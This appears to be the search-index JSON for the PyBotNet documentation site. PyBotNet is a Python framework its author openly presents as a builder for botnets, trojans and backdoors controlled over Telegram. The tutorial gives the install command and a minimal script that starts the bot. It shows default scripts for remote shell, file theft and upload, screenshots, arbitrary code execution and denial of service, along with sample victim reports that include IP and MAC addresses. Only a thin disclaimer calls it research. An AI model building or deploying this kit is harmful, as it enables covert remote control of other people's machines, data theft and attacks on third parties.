{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"PyBotNet A Python framework for building remote control , botnet , trojan or backdoor with Telegram or other control panels Disclaimer: Please note that this is a research project. I am by no means responsible for any usage of this tool. Use it on your behalf!. Source Code : https://github.com/onionj/pybotnet Documentation : https://onionj.github.io/pybotnet/ Features: \u00b6","title":"About"},{"location":"#features","text":"","title":"Features:"},{"location":"tutorial_advanced_guide/tutorial_advanced_guide_intro/","text":"comming soon..","title":"Tutorial advanced guide intro"},{"location":"tutorial_user_guide/first_step/","text":"Install PyBotNet \u00b6 pip3 install pybotnet -U --pre Note --pre : Include pre-release and development versions. By default, pip only finds stable versions. The simplest PyBotNet file could look like this: \u00b6 main.py from pybotnet import BotNet , TelegramEngine telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) #(1) botnet = BotNet ( telegram_engine ) # (2) botnet . run () create engine: Engines transfer messages between admin and botnet create BotNet instance Note TELEGRAM_TOKEN : Get it from the telegram @botfather ADMIN_CHAT_ID : Get it from @userinfobot this code include default scripts, like: shell , put_file , get_file , screenshot , who , ... Run code: \u00b6 python3 main.py telegram engine \u00b6 open telegram and send /who to your bot; If you have done the steps correctly, you recive message like this: scripts_name: echo who shell screenshot put_file get_file runcode openurl dos schedule mac_addres: 228362405364 os: Linux global_ip: 5.10.30.35 country: Iran, Islamic Republic of bot_name: no_name local_ip: {'192.168.23.160'} host_name: {'system_name'} system_user: root up_time: 0:00:01 current_route: / pid: 148352 cpu_count: 8 pybotnet_version: 2.0.8b0 from cache: True you can send /help to see help page, or send /help <script_name> to recive more help about script. for example send /help screenshot , You will receive: NAME: screenshot DESCRIPTION: get screen shot * `[mac-address] /screenshot` or * `/screenshot` example command: * `94945035671481 /screenshot` * `/screenshot` return: img or img-download-link script_version: 0.0.1 default_script: True ___________________________ scripts_name: ['echo', 'who', 'shell', 'screenshot', 'put_file', 'get_file', 'runcode', 'openurl', 'dos', 'schedule'] mac_addres: 228362405364 os: Linux global_ip: 5.160.39.34 country: Iran, Islamic Republic of bot_name: no_name use_proxy: False in top of message you see script name, description, syntax and examples. for run screenshot script you have two choice: Run the script on all clients that are listening to Telegram bot (for now we have one!) Run script on one system for run script on all client send /screenshot bot if you need get screen shot on specific system you need send [mac_addres] /screenshot for our case: 228362405364 /screenshot","title":"First step"},{"location":"tutorial_user_guide/first_step/#install-pybotnet","text":"pip3 install pybotnet -U --pre Note --pre : Include pre-release and development versions. By default, pip only finds stable versions.","title":"Install PyBotNet"},{"location":"tutorial_user_guide/first_step/#the-simplest-pybotnet-file-could-look-like-this","text":"main.py from pybotnet import BotNet , TelegramEngine telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) #(1) botnet = BotNet ( telegram_engine ) # (2) botnet . run () create engine: Engines transfer messages between admin and botnet create BotNet instance Note TELEGRAM_TOKEN : Get it from the telegram @botfather ADMIN_CHAT_ID : Get it from @userinfobot this code include default scripts, like: shell , put_file , get_file , screenshot , who , ...","title":"The simplest PyBotNet file could look like this:"},{"location":"tutorial_user_guide/first_step/#run-code","text":"python3 main.py","title":"Run code:"},{"location":"tutorial_user_guide/first_step/#telegram-engine","text":"open telegram and send /who to your bot; If you have done the steps correctly, you recive message like this: scripts_name: echo who shell screenshot put_file get_file runcode openurl dos schedule mac_addres: 228362405364 os: Linux global_ip: 5.10.30.35 country: Iran, Islamic Republic of bot_name: no_name local_ip: {'192.168.23.160'} host_name: {'system_name'} system_user: root up_time: 0:00:01 current_route: / pid: 148352 cpu_count: 8 pybotnet_version: 2.0.8b0 from cache: True you can send /help to see help page, or send /help <script_name> to recive more help about script. for example send /help screenshot , You will receive: NAME: screenshot DESCRIPTION: get screen shot * `[mac-address] /screenshot` or * `/screenshot` example command: * `94945035671481 /screenshot` * `/screenshot` return: img or img-download-link script_version: 0.0.1 default_script: True ___________________________ scripts_name: ['echo', 'who', 'shell', 'screenshot', 'put_file', 'get_file', 'runcode', 'openurl', 'dos', 'schedule'] mac_addres: 228362405364 os: Linux global_ip: 5.160.39.34 country: Iran, Islamic Republic of bot_name: no_name use_proxy: False in top of message you see script name, description, syntax and examples. for run screenshot script you have two choice: Run the script on all clients that are listening to Telegram bot (for now we have one!) Run script on one system for run script on all client send /screenshot bot if you need get screen shot on specific system you need send [mac_addres] /screenshot for our case: 228362405364 /screenshot","title":"telegram engine"}]}